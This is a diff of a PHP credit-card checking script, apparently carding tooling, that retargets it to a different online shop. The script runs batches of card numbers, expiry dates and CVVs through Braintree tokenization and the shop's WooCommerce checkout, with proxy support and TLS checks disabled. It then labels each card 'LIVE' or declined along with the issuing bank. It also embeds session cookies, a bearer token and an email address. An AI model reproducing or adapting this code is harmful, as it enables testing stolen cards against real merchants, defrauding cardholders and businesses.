@@ -150,50 +150,51 @@ $dbtime = substr(str_shuffle(str_repeat("0123456789", 10)), 0, 10);
  // Request 1
 
 
-// $ch = curl_init();
-// curl_setopt($ch, CURLOPT_URL, 'https://www.europeanestheticshop.com/checkout/OpcSavePaymentInfo/');
-// curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-// curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-// curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-// curl_setopt($ch, CURLOPT_POST, 1);
-// // curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
-// // curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
-// curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
-// curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
-// // curl_setopt($ch, CURLOPT_PROXY, $poxySocks5);
-// // curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS4);
-// curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate, br');
-// # Uncomment the upper two lines if you have filled the upper login details
-// curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-// 'accept: */*',
-// 'accept-encoding: gzip, deflate, br',
-// 'accept-language: en-US,en;q=0.9',
-// 'content-type: application/x-www-form-urlencoded; charset=UTF-8',
-// 'cookie: NopCommerce.RecentlyViewedProducts=RecentlyViewedProductIds=41; __RequestVerificationToken=N5PrqU2Pq7LYxEuvFw6kRiD3kDMqglRuPAyhWlSt4-A4uJWOd-aZOI_tarRSV3m2-F4NHwJ6pLS_CU1c4j2uMGQeA0Q1; ASP.NET_SessionId=kgo2dgwwrcgsei4ndipszvjz; NOPCOMMERCE.AUTH=AD8DE3E47476D0F5AF597AD05B3173B108300809F0369902901E6516541CBEC2E8B59DFA3E882DF37945D08CF83F7E9D0EA633794F3989C7736058873B026FCBCB7AB59E05972A72559F7225924CA88EE016BEDF8F9CE3AC02AA1E6B10C1E259D2C9F20389FD871BF318E39EF101FF54F17F5AED09F2F7D5C3B02C25C395EB1F2214C323A75E4B19D53A48D772B9A578D49E92DE; Nop.customer=f7e821bd-d293-4dbf-8f04-a5cbf48c42f2',
-// 'origin: https://www.europeanestheticshop.com',
-// 'referer: https://www.europeanestheticshop.com/en/onepagecheckout',
-// 'user-agent: '.$browser.''
-// ));
-// curl_setopt($ch, CURLOPT_POSTFIELDS, 'CardholderName=Vincent+Warner&CardNumber='.$cc.'&ExpireMonth='.$mes1.'&ExpireYear='.$ano.'&CardCode='.$cvv.'');
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_POST, 1);
+// curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
+// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
+// curl_setopt($ch, CURLOPT_PROXY, $poxySocks5);
+// curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS4);
+curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate, br');
+# Uncomment the upper two lines if you have filled the upper login details
+curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+'accept: */*',
+'accept-encoding: gzip, deflate, br',
+'accept-language: en-US,en;q=0.9',
+'authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6IkF1dGh5In0.eyJleHAiOjE1OTA0ODA2MjksImp0aSI6Ijc4ZDEzNmMyLTdlNTgtNGFjNC1hZGRmLTNlNTc2M2I1NmU1NSIsInN1YiI6IjNzejg3cXAyOHh5cjhoOGciLCJpc3MiOiJBdXRoeSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjNzejg3cXAyOHh5cjhoOGciLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwib3B0aW9ucyI6eyJtZXJjaGFudF9hY2NvdW50X2lkIjoiRW5kbGVzc2x5RWxhdGVkX2luc3RhbnQifX0.lIu2fiN9sa4oYW4_8ZZijolB3CaviKt3HnJ57flobfWbz9M25aAaMvA_PPribhJOVEc0Py2CnDsvxLdrPYHQ2A',
+'braintree-version: 2018-05-10',
+'content-type: application/json',
+'origin: https://assets.braintreegateway.com',
+'referer: https://payments.braintree-api.com/',
+'user-agent: '.$browser.''
+));
+curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"e1cb6a2a-18d8-4221-b7b2-159d6bf8b525"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'""cvv":"'.$cvv.'","billingAddress":{"postalCode":"33101","streetAddress":"12 avenue"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');
 
-// $b_pago = curl_exec($ch);
+$b_pago = curl_exec($ch);
 
-// curl_close($ch);
+curl_close($ch);
 
-//    // echo $b_pago;
-// // $token = trim(strip_tags(getstr($b_pago,'"nonce":"','"')));
-// // // $token2 = trim(strip_tags(getstr($b_pago,'"client_secret": "','"')));
-// // $issuebank = trim(strip_tags(getstr($b_pago,'"issuingBank":"','"')));
-// // $issuecountry = trim(strip_tags(getstr($b_pago,'"countryOfIssuance":"','"')));
-// // $type = trim(strip_tags(getstr($b_pago,'"debit":"','"')));
-// // $category = trim(strip_tags(getstr($b_pago,'"commercial":"','"')));
+   // echo $b_pago;
+$token = trim(strip_tags(getstr($b_pago,'"token":"','"')));
+// $token2 = trim(strip_tags(getstr($b_pago,'"client_secret": "','"')));
+$issuebank = trim(strip_tags(getstr($b_pago,'"issuingBank":"','"')));
+$issuecountry = trim(strip_tags(getstr($b_pago,'"countryOfIssuance":"','"')));
+$type = trim(strip_tags(getstr($b_pago,'"debit":"','"')));
+$category = trim(strip_tags(getstr($b_pago,'"commercial":"','"')));
 
 
 
 
 
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://zodianz.com/?wc-ajax=checkout');
+curl_setopt($ch, CURLOPT_URL, 'https://endlesslyelated.com/?wc-ajax=checkout');
 
 //////////////////////// PROXY CALLS ////////////////////////////
 //               REMOVE '//' FOR PROXIES TO WORK BELOW
@@ -226,15 +227,15 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 'accept-encoding: gzip, deflate, br',
 'accept-language: en-US,en;q=0.9',
 'content-type: application/x-www-form-urlencoded; charset=UTF-8',
-'cookie: PHPSESSID=a7acf4b9b36ed2adf295fcbf0594d81d; wordpress_logged_in_b9ae7e7c08ca63d7790dbd22f9ddd964=hotshot69%7C1591104686%7CROZ8vLyBRWgJhq8cq2rTSEs8OS7SseImWUct1rDpbcp%7C3a66325483a7a248938a861801054b5ab4d7471f6c4ed5d22fa4d21def65c0d3; _wp_session=cea2ce1dc209804311c2c66e96f2f2bc%7C%7C1590433318%7C%7C1650006118; wfwaf-authcookie-a05d541a58682044948ca1c492a67fb3=1163%7C%7C5e54b8ae5c3c3e6ff185afc347e097f7f3da29ec2d6835d5e025286f475fe1e6; wpSGCacheBypass=1; JCS_INENREF=https%3A//zodianz.com/cart/; JCS_INENTIM=1590390137888; _wpss_p_=N%3A2%20%7C%20WzFdW0Nocm9tZSBQREYgUGx1Z2luXSBbMl1bQ2hyb21lIFBERiBWaWV3ZXJdIA%3D%3D; wp_woocommerce_session_b9ae7e7c08ca63d7790dbd22f9ddd964=1163%7C%7C1590562954%7C%7C1590559354%7C%7C4c8367874af4b62b6135ebe49e6692fb; woocommerce_items_in_cart=1; woocommerce_cart_hash=584324920eabf25e5c6595513cec987f; _wpss_h_=9',
-'origin: https://zodianz.com',
-'referer: https://zodianz.com/checkout/',
+'cookie: cookielawinfo-checkbox-necessary=yes; cookielawinfo-checkbox-non-necessary=yes; mailchimp_landing_site=https%3A%2F%2Fendlesslyelated.com%2Fproduct%2Fchampagne-glass%2F; endlesslyeactive=Vincent; closedNavigator=no; woocommerce_items_in_cart=1; mailchimp.cart.current_email=pubgkittu@gmail.com; mailchimp.cart.previous_email=pubgkittu@gmail.com; wordpress_logged_in_eaa739e4ea58e758e9914696754338fc=hotshot69%7C1591603720%7C081gju4kRzDfSFGjQclMy7fg1Iezw3C8jyV8Qj0AQSA%7C54d4482e0dae3f7e5921993153de69d2da3349be37cc901b97f7848bc1bcb0c1; wp_woocommerce_session_eaa739e4ea58e758e9914696754338fc=38%7C%7C1590566865%7C%7C1590563265%7C%7Ced8502088cd4e1ff807a105e919cf89d; wfwaf-authcookie-e8c9b3b674acdf3b86b9c9a233cadc71=38%7C%7C1f3ee9a93d9199de9f87bfc32753d890f4329f7b6dfd2efeae0abab367eccb1c; woocommerce_cart_hash=91a0685b7ed77dc44416cfefa08ff99d; viewed_cookie_policy=yes',
+'origin: https://endlesslyelated.com',
+'referer: https://endlesslyelated.com/checkout/',
 'user-agent: '.$browser.''
 ));
 
 //////////////////////// START POST FILED 1 ////////////////////////
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'billing_first_name='.$nombre.'&billing_last_name='.$apellido.'&billing_country=US&billing_address_1=12+avenue&billing_address_2=&billing_city=Miami&billing_state=FL&billing_postcode=33101&billing_phone=05182641524&billing_email=vvarner3%40gmail.com&order_comments=&payment_method=first_data_payeezy_gateway_credit_card&wc-first-data-payeezy-gateway-credit-card-account-number='.$cc.'&wc-first-data-payeezy-gateway-credit-card-expiry='.$mes.'+%2F+'.$ano.'&wc-first-data-payeezy-gateway-credit-card-csc='.$cvv.'&terms=on&terms-field=1&woocommerce-process-checkout-nonce=445cc98ccb&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&0acb1f222af335f4838db2828d210d45=6f2277cdb80cb4dd04ced63e0a5e68a9');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'billing_first_name=Vincent&billing_last_name=Warner&billing_country=US&billing_address_1=12+avenue&billing_address_2=&billing_city=Miami&billing_state=FL&billing_postcode=33101&billing_phone=5182641744&billing_email=pubgkittu%40gmail.com&ss_wc_mailchimp_opt_in=yes&shipping_first_name=Vincent&shipping_last_name=Warner&shipping_country=US&shipping_address_1=12+avenue&shipping_address_2=&shipping_city=Miami&shipping_state=FL&shipping_postcode=33101&shipping_phone=5182641744&order_comments=&shipping_method%5B0%5D=free_shipping%3A3&payment_method=braintree_cc&braintree_cc_nonce_key='.$token.'&braintree_cc_device_data=%7B%22device_session_id%22%3A%223077dd2db68663d0dce164142991e13b%22%2C%22fraud_merchant_id%22%3Anull%2C%22correlation_id%22%3A%2243d135b16f765f6a85039b4767081aae%22%7D&wc_braintree_3ds_enabled=&wc_braintree_3ds_active=&braintree_cc_3ds_nonce_key=&braintree_cc_config_data=%7B%22environment%22%3A%22production%22%2C%22clientApiUrl%22%3A%22https%3A%2F%2Fapi.braintreegateway.com%3A443%2Fmerchants%2F3sz87qp28xyr8h8g%2Fclient_api%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fassets.braintreegateway.com%22%2C%22analytics%22%3A%7B%22url%22%3A%22https%3A%2F%2Fclient-analytics.braintreegateway.com%2F3sz87qp28xyr8h8g%22%7D%2C%22merchantId%22%3A%223sz87qp28xyr8h8g%22%2C%22venmo%22%3A%22off%22%2C%22graphQL%22%3A%7B%22url%22%3A%22https%3A%2F%2Fpayments.braintree-api.com%2Fgraphql%22%2C%22features%22%3A%5B%22tokenize_credit_cards%22%5D%7D%2C%22applePayWeb%22%3A%7B%22countryCode%22%3A%22US%22%2C%22currencyCode%22%3A%22USD%22%2C%22merchantIdentifier%22%3A%223sz87qp28xyr8h8g%22%2C%22supportedNetworks%22%3A%5B%22visa%22%2C%22mastercard%22%2C%22amex%22%2C%22discover%22%5D%7D%2C%22kount%22%3A%7B%22kountMerchantId%22%3Anull%7D%2C%22challenges%22%3A%5B%5D%2C%22creditCards%22%3A%7B%22supportedCardTypes%22%3A%5B%22Discover%22%2C%22JCB%22%2C%22MasterCard%22%2C%22Visa%22%2C%22American+Express%22%5D%7D%2C%22threeDSecureEnabled%22%3Afalse%2C%22threeDSecure%22%3Anull%2C%22paypalEnabled%22%3Atrue%2C%22paypal%22%3A%7B%22displayName%22%3A%22Endlessly+Elated%22%2C%22clientId%22%3A%22ATlYzBix0e5lPXmplc4LeF_WRi2b0u_itiW3cGBf93ynXpUp19Jqog7ablWLyBG8KBjTz6JDKrGiaTtG%22%2C%22privacyUrl%22%3A%22https%3A%2F%2Fendlesslyelated.com%2Fprivacy-policy%22%2C%22userAgreementUrl%22%3A%22https%3A%2F%2Fendlesslyelated.com%2Fterms-conditions%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fcheckout.paypal.com%22%2C%22environment%22%3A%22live%22%2C%22environmentNoNetwork%22%3Afalse%2C%22unvettedMerchant%22%3Afalse%2C%22braintreeClientId%22%3A%22ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW%22%2C%22billingAgreementsEnabled%22%3Atrue%2C%22merchantAccountId%22%3A%22EndlesslyElated_instant%22%2C%22payeeEmail%22%3Anull%2C%22currencyIsoCode%22%3A%22USD%22%7D%7D&braintree_paypal_nonce_key=&braintree_paypal_device_data=&terms=on&terms-field=1&woocommerce-process-checkout-nonce=30469d1d2a&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review');
 
 // // // //*****************************************************************************************************************************************************************************************************************************************************************************
 
@@ -245,7 +246,7 @@ if (curl_errno($ch)) {
 }
 curl_close($ch);
 
-$message = trim(strip_tags(getstr($result,'"message":"','"')));
+$message = trim(strip_tags(getstr($result,'"messages":"<ul class=\"woocommerce-error\" role=\"alert\">\n\t\t\t<li>\n\t\t\tThere was an error processing your payment. Reason: ','\t\t<\/li>\n\t<\/ul>\n<input type=\"hidden\" id=\"wc_braintree_checkout_error\" value=\"true\" \/>"')));
  // $code = trim(strip_tags(getstr($result,'"status":"','"')));
  // $message2 = trim(strip_tags(getstr($result,'"decline_code": "','"')));
 
@@ -254,16 +255,16 @@ $message = trim(strip_tags(getstr($result,'"message":"','"')));
 
 /////////////////// RESULT ////////////////////////////////////
 if(strpos($result,'"result":"success"')){
-    echo '<tr><td><font size="2"><font color="#00FF00">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ LIVE ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | DEBIT- '.$type.' | cat-'.$category.'</font></b></font></td></tr>';
+    echo '<tr><td><font size="2"><font color="#00FF00">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ L I V E ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | DEBIT- '.$type.' | cat-'.$category.'</font></b></font></td></tr>';
 
 
    }
-// elseif(strpos($result,'Insufficient Funds')){
-//   echo '<tr><td><font size="2"><font color="#FF0000">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ LIVE ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | DEBIT- '.$type.' | cat-'.$category.'</font></b></font></td></tr>';
-//    }
+elseif(strpos($result,'Insufficient Funds')){
+  echo '<tr><td><font size="2"><font color="#FF0000">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ LIVE ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | DEBIT- '.$type.' | cat-'.$category.'</font></b></font></td></tr>';
+   }
 else {
 
-       echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ DECLINE ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | DEBIT- '.$type.' | cat- '.$category.'</font></b></font></td></tr>';
+       echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ '.$message.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | DEBIT- '.$type.' | cat- '.$category.'</font></b></font></td></tr>';
 
 // updatecart();
 }
